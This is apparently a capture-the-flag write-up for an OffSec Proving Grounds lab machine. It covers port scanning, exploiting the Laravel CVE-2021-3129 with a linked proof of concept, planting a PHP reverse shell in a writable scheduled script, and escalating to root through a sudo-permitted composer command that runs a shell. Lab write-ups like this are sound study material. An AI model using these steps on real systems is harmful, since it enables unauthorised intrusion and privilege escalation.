---

title: CTF-200-07 (OffSec. Proving Grounds)
image: /assets/writeups/trace10.jpg
description: Write-up of CTF-200-07 Machine
date: 2023-12-29 09:00:00 -3000
categories: [proving grounds]
tags: [lavaral, CVE, LAvita, linux]
author: trace

---

## Enumeration:

```bash
nmap -sC -sV <IP>
```

```xml
Host is up, received syn-ack (0.23s latency).
Scanned at 2023-12-28 00:54:45 IST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

So we found two ports open `22` & `80`

#### Port 80:

Visiting Port `80` we see a web app running which is also running **Laravel 8.4.0**, Quick Google Search and I found [CVE-2021-3129](https://security.snyk.io/vuln/SNYK-PHP-FACADEIGNITION-1059267)

> [POC](https://raw.githubusercontent.com/joshuavanderpoll/CVE-2021-3129/main/CVE-2021-3129.py)

## www-data:

We can use this POC to execute the commands like:

![poccheck.png](../../assets/writeups/2023-12-27-CTF-200-07/poccheck.png)

Running the POC to get callback for reverse shell,

![gettingrev1.png](../../assets/writeups/2023-12-27-CTF-200-07/gettingrev1.png)

and we get the user shell

![rev2.png](../../assets/writeups/2023-12-27-CTF-200-07/rev2.png)

## Getting User:

User skunk belong to sudo(27) group (Found in linPEAS result). So we need to get shell as user skunk.

Running Pspy to check for the necessary files and ways we can get the skunk shell and i found this php file running which belongs to user `Skunk` 

![pspyresult.png](../../assets/writeups/2023-12-27-CTF-200-07/pspyresult.png)

And we have Write Access to it, 

![writeaccess.png](../../assets/writeups/2023-12-27-CTF-200-07/writeaccess.png)

Injecting a PHP reverse shell will get us the shell as user `Skunk`

![Screenshot_2023-12-28_11-47-12.png](../../assets/writeups/2023-12-27-CTF-200-07/Screenshot_2023-12-28_11-47-12.png)

## Getting Root:

Sticking to the basics i ran `sudo -l` and i found 

```bash
skunk@debian:/$ sudo -l
sudo -l
Matching Defaults entries for skunk on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User skunk may run the following commands on debian:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *

```

And [GTFO](https://gtfobins.github.io/gtfobins/composer/#limited-suid) has exploit method for composer, we follow the path 

```bash
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >/var/www/html/lavita/composer.json
```

Since only `www-data` has write access to it, so do this whilst being in the `www-data` shell and then back to `Skunk` shell we run

```bash
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
```

and we get root shell

![root.png](../../assets/writeups/2023-12-27-CTF-200-07/root.png)


